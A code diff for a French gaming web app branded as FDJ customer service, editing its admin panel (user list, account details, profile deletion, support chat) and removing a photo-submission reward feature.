+                let html = `<div class="msg bot">Bonjour <strong>${this.currentUser ? this.currentUser.split(' ')[0] : 'Joueur'}</strong>. Service client FDJ.</div>`;
                 
                 logs.forEach(l => {
                     if(l.sender === 'user') {
@@ -1773,7 +1665,6 @@
                     document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                     navElement.classList.add('active');
                 }
-                
                 let area = document.querySelector('.content-area');
                 if(area) area.scrollTop = 0;
                 this.jouerSon('click');
@@ -1805,9 +1696,8 @@
                 if(!listEl) return;
                 
                 let keys = Object.keys(this.usersDB || {});
-
                 if(keys.length === 0) {
-                    listEl.innerHTML = `<p style="font-size:0.78rem; color:var(--text-muted);">Aucun utilisateur.</p>`;
+                    listEl.innerHTML = `<p style="font-size:0.78rem; color:var(--text-muted);">Aucun utilisateur enregistré.</p>`;
                 } else {
                     keys.sort((a, b) => {
                         let accA = this.usersDB[a], accB = this.usersDB[b];
@@ -1839,7 +1729,7 @@
                 if(convListEl) {
                     let chatKeys = Object.keys(this.chatLogs || {});
                     if(chatKeys.length === 0) {
-                        convListEl.innerHTML = `<p style="font-size:0.78rem; color:var(--text-muted);">Aucune conversation active.</p>`;
+                        convListEl.innerHTML = `<p style="font-size:0.78rem; color:var(--text-muted);">Aucune conversation.</p>`;
                     } else {
                         convListEl.innerHTML = chatKeys.map(ck => {
                             let acc = this.usersDB[ck];
@@ -1854,25 +1744,6 @@
                         }).join('');
                     }
                 }
-
-                let subEl = document.getElementById('admin-submissions-list');
-                if(subEl) {
-                    let pendingSubs = (this.submissions || []).filter(s => s.status === 'pending');
-                    if(pendingSubs.length === 0) {
-                        subEl.innerHTML = `<p style="font-size:0.75rem; color:var(--text-muted); font-style:italic;">Aucune photo en attente.</p>`;
-                    } else {
-                        subEl.innerHTML = pendingSubs.map((sub, idx) => `
-                            <div style="background:rgba(0,0,0,0.6); border:1px solid rgba(239,68,68,0.3); border-radius:10px; padding:8px; margin-bottom:8px;">
-                                <div style="font-size:0.78rem; font-weight:bold; color:#38bdf8; margin-bottom:4px;">👤 ${sub.userName} (${sub.time})</div>
-                                <img src="${sub.image}" style="width:100%; max-height:120px; object-fit:cover; border-radius:6px; margin-bottom:6px;">
-                                <div style="display:flex; gap:6px;">
-                                    <button class="btn btn-green" style="font-size:0.7rem; padding:6px;" onclick="app.validerSoumission(${idx}, true)">Valider (+${sub.reward} 🪙)</button>
-                                    <button class="btn btn-outline" style="font-size:0.7rem; padding:6px; background:rgba(239,68,68,0.2); color:#ef4444;" onclick="app.validerSoumission(${idx}, false)">Rejeter</button>
-                                </div>
-                            </div>
-                        `).join('');
-                    }
-                }
             },
 
             selectionnerUtilisateurAdmin(emailKey) {
@@ -1882,28 +1753,21 @@
 
                 const nameEl = document.getElementById('adm-det-name');
                 if(nameEl) nameEl.innerText = acc.nom;
-                
                 const emailEl = document.getElementById('adm-det-email');
                 if(emailEl) emailEl.innerText = acc.email || emailKey;
-                
                 const loginTimeEl = document.getElementById('adm-det-login-time');
                 if(loginTimeEl) loginTimeEl.innerText = acc.loginTime || "Inconnue";
-                
                 const sessionTimeEl = document.getElementById('adm-det-session-time');
                 if(sessionTimeEl) sessionTimeEl.innerText = Math.floor((Date.now() - (this.sessionStartTimestamp || Date.now())) / 60000) + " min";
-                
                 const balanceEl = document.getElementById('adm-det-balance');
                 if(balanceEl) balanceEl.innerText = acc.balance !== undefined ? acc.balance : 15;
-                
                 const cashEl = document.getElementById('adm-det-cash');
                 if(cashEl) cashEl.innerText = (acc.cash || 0).toFixed(2) + " €";
-                
                 const gamesEl = document.getElementById('adm-det-games');
                 if(gamesEl) gamesEl.innerText = acc.gamesPlayed || 0;
 
                 const detailCard = document.getElementById('admin-user-detail-card');
                 if(detailCard) detailCard.classList.remove('hidden');
-                
                 this.chargerAdminData();
             },
 
@@ -1916,11 +1780,9 @@
 
             supprimerUtilisateurAdmin() {
                 if(!this.selectedAdminUserEmail) return;
-                if(confirm(`Voulez-vous vraiment supprimer ce profil ?`)) {
+                if(confirm(`Supprimer ce profil ?`)) {
                     delete this.usersDB[this.selectedAdminUserEmail];
-                    if(db) {
-                        db.ref('users/' + this.selectedAdminUserEmail).remove();
-                    }
+                    if(db) db.ref('users/' + this.selectedAdminUserEmail).remove();
                     localStorage.setItem('fdj_users', JSON.stringify(this.usersDB));
                     this.fermerAdminDetail();
                     this.chargerAdminData();
@@ -1930,28 +1792,22 @@
             ouvrirAdminChat(emailKey) {
                 this.activeAdminTargetEmail = emailKey;
                 let acc = this.usersDB[emailKey];
-                
                 const activeTitle = document.getElementById('admin-active-user-title');
-                if(activeTitle) activeTitle.innerText = "Discussion avec : " + (acc ? acc.nom : emailKey);
+                if(activeTitle) activeTitle.innerText = "Discussion : " + (acc ? acc.nom : emailKey);
                 
                 const convList = document.getElementById('admin-conversations-list');
                 if(convList) convList.classList.add('hidden');
-                
                 const activeChatBox = document.getElementById('admin-active-chat-box');
                 if(activeChatBox) activeChatBox.classList.remove('hidden');
-                
                 this.rafraichirThreadAdmin();
             },
 
             fermerAdminChat() {
                 this.activeAdminTargetEmail = null;
-                
                 const activeChatBox = document.getElementById('admin-active-chat-box');
                 if(activeChatBox) activeChatBox.classList.add('hidden');
-                
                 const convList = document.getElementById('admin-conversations-list');
                 if(convList) convList.classList.remove('hidden');
-                
                 this.chargerAdminData();
             },
 
@@ -1978,46 +1834,14 @@
                 if(!txt || !this.activeAdminTargetEmail) return;
 
                 if(!this.chatLogs[this.activeAdminTargetEmail]) this.chatLogs[this.activeAdminTargetEmail] = [];
-                
                 this.chatLogs[this.activeAdminTargetEmail].push({ sender: 'admin', text: txt, time: new Date().toLocaleTimeString() });
                 
-                if(db) {
-                    db.ref('chats/' + this.activeAdminTargetEmail).set(this.chatLogs[this.activeAdminTargetEmail]);
-                }
+                if(db) db.ref('chats/' + this.activeAdminTargetEmail).set(this.chatLogs[this.activeAdminTargetEmail]);
                 localStorage.setItem('fdj_chat_logs', JSON.stringify(this.chatLogs));
 
                 input.value = "";
                 this.rafraichirThreadAdmin();
                 this.vibrer([20]);
-            },
-
-            validerSoumission(idx, approuve) {
-                let pendingSubs = (this.submissions || []).filter(s => s.status === 'pending');
-                let sub = pendingSubs[idx];
-                if(!sub) return;
-
-                sub.status = approuve ? 'approved' : 'rejected';
-                localStorage.setItem('fdj_submissions', JSON.stringify(this.submissions));
-
-                if(approuve) {
-                    let acc = this.usersDB[sub.userEmail];
-                    if(acc) {
-                        acc.balance = (acc.balance !== undefined ? acc.balance : 15) + sub.reward;
-                        this.usersDB[sub.userEmail] = acc;
-                        if(db) {
-                            db.ref('users/' + sub.userEmail).set(acc);
-                        }
-                        localStorage.setItem('fdj_users', JSON.stringify(this.usersDB));
-                        if(sub.userEmail === this.currentEmail) {
-                            this.balance = acc.balance;
-                            this.updateUI();
-                        }
-                    }
-                    alert(`Défi validé ! +${sub.reward} pièces versées au joueur.`);
-                } else {
-                    alert("Défi rejeté.");
-                }
-                this.chargerAdminData();
             }
         };
 
